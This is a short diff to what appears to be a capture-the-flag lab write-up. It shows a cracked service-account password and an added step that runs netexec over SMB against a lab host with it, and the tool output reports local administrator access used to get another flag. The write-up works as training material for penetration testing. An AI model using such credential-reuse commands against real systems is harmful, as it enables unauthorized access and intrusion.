@@ -469,6 +469,12 @@ I have cracked the hash using this wordlist after the initial attempt with rocky
 svc_webpool:D@rkH@v3n128!
 ```
 
-```python
 
+# Compromising `svc_webpool` on `web.ext.darkhaven.local`
+```python
+nxc smb web.ext.darkhaven.local -u 'svc_webpool' -p 'D@rkH@v3n128!' --local-auth
+SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [*] Windows 11 / Server 2025 Build 26100 (name:EC2AMAZ-IKFPL26) (domain:EC2AMAZ-IKFPL26) (signing:False) (SMBv1:None)
+SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [+] EC2AMAZ-IKFPL26\svc_webpool:D@rkH@v3n128! (Pwn3d!)
 ```
+Since this is a web user i wanted to try auth here and here i am a local admin so i can get another flag
+
